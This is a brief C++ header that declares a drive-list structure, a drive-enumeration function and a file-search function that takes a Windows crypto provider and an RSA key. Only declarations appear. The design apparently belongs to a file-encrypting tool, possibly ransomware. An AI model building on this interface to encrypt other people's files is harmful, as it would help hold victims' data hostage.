#pragma once
#include "../common.h"
#include "../queue.h"
#include "memory.h"

namespace filesystem {

	typedef struct drive_info_ {

		std::wstring RootPath;
		TAILQ_ENTRY(drive_info_) Entries;

	} DRIVE_INFO, *PDRIVE_INFO;

	typedef TAILQ_HEAD(drive_list_, drive_info_) DRIVE_LIST, * PDRIVE_LIST;

	INT EnumirateDrives(PDRIVE_LIST DriveList);
	VOID SearchFiles(std::wstring StartDirectory, HCRYPTPROV CryptoProvider, HCRYPTKEY RsaKey, LPBYTE Buffer);

}